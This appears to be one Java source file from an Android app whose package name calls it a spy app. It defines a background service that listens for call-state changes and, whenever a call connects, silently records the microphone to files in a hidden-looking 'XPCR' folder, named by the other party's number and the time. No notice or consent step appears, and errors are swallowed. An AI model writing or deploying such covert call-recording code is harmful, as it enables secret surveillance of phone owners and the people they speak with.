package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class callRecordService extends Service {

    MediaRecorder recorder;
    public callRecordService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Log.e("serviceStart", "service3");
        TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        TelephonyMgr.listen(new TeleListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }
    class TeleListener extends PhoneStateListener {
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:
                    // CALL_STATE_IDLE;
                    stopRecording();

                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    // CALL_STATE_OFFHOOK;
                    startRecoding(incomingNumber);
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    // CALL_STATE_RINGING
                    break;
                default:
                    break;
            }
        }
    }

    public void startRecoding(String phnumber) {
        try {
            recorder = new MediaRecorder();
            recorder.reset();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
            Calendar c=Calendar.getInstance();
            SimpleDateFormat df=new SimpleDateFormat("dd-MMM-yyyy");
            String day=df.format(c.getTime());
            SimpleDateFormat tf=new SimpleDateFormat("HH:mm");
            String time="DATE- "+day+"  TIME- "+tf.format(c.getTime());

            File file = createDirIfNotExists(phnumber+"||"+day+"||"+time);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
        }
    }

    public void stopRecording() {
        if (recorder != null) {
            recorder.stop();
            recorder.reset();
            recorder.release();
            recorder = null;
        }
    }

    public File createDirIfNotExists(String fileName) {
        File folder = new File(Environment.getExternalStorageDirectory() + "/XPCR");
        if (!folder.exists()) {
            if (!folder.mkdirs()) {
            }
        }
        File file = new File(folder, fileName + ".3GPP");
        try {
            if (!file.exists()) {
                if (file.createNewFile()) {
                    Log.e("vipul1_file", "file is created");
                }
            }
        } catch (Exception e) {
        }
        return file;
    }
}
